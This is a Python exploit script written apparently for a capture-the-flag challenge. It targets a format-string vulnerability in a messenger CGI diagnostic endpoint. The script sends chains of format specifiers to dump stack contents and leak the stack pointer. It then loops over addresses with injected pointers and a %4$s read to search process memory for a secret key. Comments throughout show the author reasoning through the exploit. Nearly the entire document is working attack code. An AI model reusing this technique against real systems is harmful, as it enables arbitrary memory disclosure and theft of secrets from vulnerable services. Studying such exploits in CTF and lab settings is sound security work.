#!/usr/bin/env python3
import urllib.request
import urllib.parse
import struct
import time

BASE = "http://millenium-messenger.hackday.fr:8000"

def send_msg_raw(body_bytes):
    encoded = urllib.parse.quote(body_bytes, safe='')
    url = f"{BASE}/cgi-bin/msn_diag?cmd=MSG&body={encoded}"
    try:
        with urllib.request.urlopen(url, timeout=10) as resp:
            return resp.read()
    except Exception as e:
        return b""

def send_msg(body_str):
    encoded = urllib.parse.quote(body_str, safe='')
    url = f"{BASE}/cgi-bin/msn_diag?cmd=MSG&body={encoded}"
    try:
        with urllib.request.urlopen(url, timeout=10) as resp:
            return resp.read().decode('latin-1', errors='replace')
    except Exception as e:
        return f"ERROR: {e}"

def extract_diag(raw):
    marker = b'DIAG '
    idx = raw.find(marker)
    if idx >= 0:
        return raw[idx+5:].rstrip(b'\r\n')
    return raw

# The key insight: 0x8049530 is always at stack position 3
# %3$s would dereference it as a string pointer
# 
# Let's re-examine: %3$s already returned "ÃÄ*" (junk) not a key
# But position 1 (stack pointer) changes each request
# 
# Wait - position 1 is a STACK ADDRESS near where our buffer is
# The key might be stored ABOVE the stack frame (as a local buffer in main?)
# 
# New strategy: Use %p chain to dump the FULL stack including higher addresses
# where the key buffer might be allocated

print("=== Dump full stack with hex =====")
# Use many %08x separated by colons for readability
result = send_msg("%08x:" * 80)
print(result[:3000])
print()

# Let's also try: what is at position 1 (stack pointer address)?
# Can we use that as a base and scan forward?
print("=== Get current stack base address ===")
result = send_msg("AAAA%1$p")
print(f"Stack ptr: {result.strip()}")

# From the hex dump, let's look at what addresses appear that could hold key material
# The stack usually lives around 0xffxxxxxx on 32-bit Linux
# Our buffer is pointed to by pos 1

# Let's dump 200-400 bytes around the stack pointer
# First get the stack pointer
import re
match = re.search(r'0x([0-9a-f]+)', result)
if match:
    sp = int(match.group(1), 16)
    print(f"Stack addr: 0x{sp:08x}")
    
    # Scan around the stack pointer for the key
    print(f"\n=== Scanning stack memory around 0x{sp:08x} ===")
    for offset in range(-0x200, 0x400, 4):
        addr = sp + offset
        if addr < 0x1000:
            continue
        addr_bytes = struct.pack('<I', addr)
        payload = addr_bytes + b'%4$s'
        raw = send_msg_raw(payload)
        content = extract_diag(raw)
        if len(content) >= 8:
            try:
                text = content.decode('ascii')
                if all(32 <= ord(c) < 127 for c in text):
                    print(f"  0x{addr:08x} (sp+0x{offset:+05x}): {repr(text[:80])}")
            except:
                pass
        time.sleep(0.02)
